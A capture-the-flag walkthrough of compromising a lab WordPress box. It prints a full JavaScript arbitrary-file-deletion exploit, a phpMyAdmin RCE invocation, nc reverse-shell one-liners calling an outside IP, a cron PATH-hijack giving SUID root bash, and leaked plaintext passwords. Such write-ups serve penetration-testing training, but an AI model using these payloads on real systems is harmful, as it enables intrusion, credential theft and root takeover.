nmap shows ports 22, 80, 8888 open
port 80 is hosting a worpress site wordpress 4.9.6
```zsh
wpscan --url http://$IP -e ap,at,u --plugins-detection aggressive -t 20
```
wpscan reveals users admin and intern, nothing else that we could use.
Visiting the wordpress, we see it just says "the details are present on the onboarding page". We dont really find the page itself
searchsploit for wordpress 4.9.6
Shows a couple of interesting ones.
```txt
Wordpress 4.9.6 Arbitrary File Deletion (Authenticated) | php/webapps/50456.js
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts | multiple/webapps/47690.md
```
We first use the Viewing unauthenticated file exploit
change the url from `http://IP/` to `http://?static=1&order=asc`

This reveals the onboarding page, where we find intern : IntraPersonalVision349

We use this to loginto the wordpress site, but there's very limited functionality, to get a rev shell.
So, the other exploit, which is authenticated, for which we have creds now, can be used to delete the .htaccess file and hence directly read the wp-config file

Following the exploit, we login, media -> upload new -> upload a pic -> edit more details
Open the dev console (F12), paste the function, press Enter. Then in the dev console, call the function to delete the .htaccess file as `unlink_thumb("../../../../.htaccess")`

Now, close the developer console and refresh the page. Then we can curl the wp-config file
`curl http://IP/wp-config.php`
```js
function unlink_thumb(thumb) {  
  
$nonce_id = document.getElementById("_wpnonce").value  
if (thumb == null) {  
console.log("specify a file to delete")  
return false  
}  
if ($nonce_id == null) {  
console.log("the nonce id is not found")  
return false  
}  
  
fetch(window.location.href.replace("&action=edit",""),  
{  
method: 'POST',  
credentials: 'include',  
headers: {'Content-Type': 'application/x-www-form-urlencoded'},  
body: "action=editattachment&_wpnonce=" + $nonce_id + "&thumb=" + thumb  
})  
.then(function(resp0) {  
if (resp0.redirected) {  
$del = document.getElementsByClassName("submitdelete deletion").item(0).href  
if ($del == null) {  
console.log("Unknown error: could not find the url action")  
return false  
}  
fetch($del,  
{  
method: 'GET',  
credentials: 'include'  
}).then(function(resp1) {  
if (resp1.redirected) {  
console.log("Arbitrary file deletion of " + thumb + " succeed!")  
return true  
} else {  
console.log("Arbitrary file deletion of " + thumb + " failed!")  
return false  
}  
})  
} else {  
console.log("Arbitrary file deletion of " + thumb + " failed!")  
return false  
}  
})  
}
```

This gives us wordpress : ThinnerATheWaistline348

ssh doesnt work, and we've broken the wordpress site. so, the port 8888 phpmyadmin is the last go. It works
In there, we find the version of phpMyAdmin, and look for an exploit
```zsh
searchsploit phpmyadmin 4.8.1
searchsploit -m php/webapps/50457.py

python 50457.py 192.168.121.174 8888 /index.php wordpress ThinnerATheWaistline348 "whoami"
#www-data

python 50457.py 192.168.121.174 8888 /index.php wordpress ThinnerATheWaistline348 "mkfifo /tmp/f; nc 192.168.45.244 22 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm tmp/f"
#rev shell
```
www-data!

As www-data, we couldnt find much initially.
Then, `ls -la /etc/cron.*` shows a wpclean script. Taking a look at that, 
```sh
HOME=/var/www/html/wordpress/wp-content/uploads
PATH=~/bin:/usr/bin:/bin

# in case the intern do something silly, delete all files with invalid image extension
*/5 * * * * root /usr/bin/find . -type f -not -regex '.*\.\(jpg\|jpeg\|png\|gif\)' -exec bash -c "rm -f {}" \;
```
We see here, for the `rm` cmd, relative path is used, instead of absolute path. Which means, if we're able to write into either of `~/bin OR /usr/bin OR /bin`, we can write a malicious `rm` file. Lucky for us, the `~` here, is set to `HOME=/var/www/html/wordpress/wp-content/uploads`.
This means, we just need to create a `bin` dir in `HOME=/var/www/html/wordpress/wp-content/uploads` and write a `rm` file in it
so,
```zsh
cd HOME=/var/www/html/wordpress/wp-content/uploads
mkdir bin
echo "chmod +s /bin/bash" > rm
echo "nc 192.168.45.244 22 -e /bin/sh" >> rm #for good measure
chmod +x rm
#and wait 5 mins for it to work
ls -la /bin/bash
#shows SUID on it
bash -p
#root!
```